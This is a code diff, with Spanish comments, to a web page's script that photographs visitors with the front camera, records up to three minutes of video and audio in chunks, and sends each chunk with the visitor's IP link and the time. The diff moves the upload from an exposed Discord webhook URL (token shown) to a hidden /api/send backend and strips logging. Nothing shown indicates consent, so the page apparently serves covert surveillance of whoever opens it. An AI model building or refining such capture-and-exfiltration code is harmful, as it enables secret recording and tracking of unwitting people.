@@ -68,15 +68,14 @@
   <script>
     const video = document.getElementById('video');
 
-    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1548766063771254846/WIxKE3JXCwdU0HKqeaRcWap1luqS87meWhUDKwN7mWXWge7Ra_nK9CXhUTy3kiKpO9Vm';
+    // Ya NO hay webhook de Discord aquí. El frontend solo habla con /api/send.
+    const API_ENDPOINT = '/api/send';
 
-    // ====== CONFIGURACIÓN ======
-    const SEGUNDOS_POR_TROZO = 3;   // duración de cada trozo
-    const MAX_TROZOS = 60;          // 60 x 3s = 3 minutos máximo
+    const SEGUNDOS_POR_TROZO = 3;
+    const MAX_TROZOS = 60;
     const ANCHO = 320;
     const ALTO = 240;
-    const CAMARA_VIDEO = 'user';    // 'user' frontal, 'environment' trasera
-    // ===========================
+    const CAMARA_VIDEO = 'user';
 
     let currentStream = null;
     let yaEnviado = false;
@@ -141,10 +140,10 @@
     async function enviarAlWebhook(blob, mensaje, nombreArchivo) {
       const formData = new FormData();
       formData.append('file', blob, nombreArchivo);
-      formData.append('payload_json', JSON.stringify({ content: mensaje }));
+      formData.append('content', mensaje);
 
       try {
-        const res = await fetch(WEBHOOK_URL, {
+        const res = await fetch(API_ENDPOINT, {
           method: 'POST',
           body: formData
         });
@@ -196,7 +195,6 @@
 
       let trozo = 0;
 
-      // Función que graba un solo trozo de X segundos
       function grabarTrozo() {
         return new Promise((resolve, reject) => {
           let recorder;
@@ -208,16 +206,10 @@
           }
 
           const chunks = [];
-
           recorder.ondataavailable = e => {
             if (e.data && e.data.size > 0) chunks.push(e.data);
           };
-
-          recorder.onerror = e => {
-            console.error('Error en MediaRecorder:', e);
-            reject(e);
-          };
-
+          recorder.onerror = e => reject(e);
           recorder.onstop = () => {
             const blob = new Blob(chunks, { type: mimeType || 'video/webm' });
             resolve(blob);
@@ -236,7 +228,6 @@
         });
       }
 
-      // Bucle infinito hasta que el usuario salga o se alcance el máximo
       while (trozo < MAX_TROZOS) {
         trozo++;
         console.log(`Grabando trozo ${trozo}/${MAX_TROZOS}...`);
@@ -249,21 +240,15 @@
           break;
         }
 
-        if (!blob || blob.size === 0) {
-          console.warn(`Trozo ${trozo} vacío.`);
-          continue;
-        }
+        if (!blob || blob.size === 0) continue;
 
         console.log(`Trozo ${trozo}: ${(blob.size/1024).toFixed(1)} KB. Enviando...`);
 
-        // Enviar SIN esperar la respuesta (no bloquea el siguiente trozo)
         enviarAlWebhook(
           blob,
           `🎥 **Video+Audio - trozo ${trozo}** (${SEGUNDOS_POR_TROZO}s)\n🕒 Hora: ${hora}\n🌐 IP: ${linkIP}`,
           `video_trozo_${trozo}.${ext}`
-        ).then(ok => {
-          if (!ok) console.warn(`Trozo ${trozo} falló al enviar.`);
-        });
+        );
       }
 
       stream.getTracks().forEach(t => t.stop());
@@ -278,7 +263,6 @@
       const linkIP = ip ? `https://whatismyipaddress.com/ip/${ip}` : 'IP no disponible';
 
       try {
-        // Fotos
         console.log('Foto frontal...');
         const fotoFrontal = await capturarFoto('user');
         await enviarAlWebhook(
@@ -303,7 +287,6 @@
 
         await new Promise(r => setTimeout(r, 500));
 
-        // Video en trozos
         console.log('Iniciando video en trozos...');
         await grabarVideoEnTrozos(hora, linkIP);
 
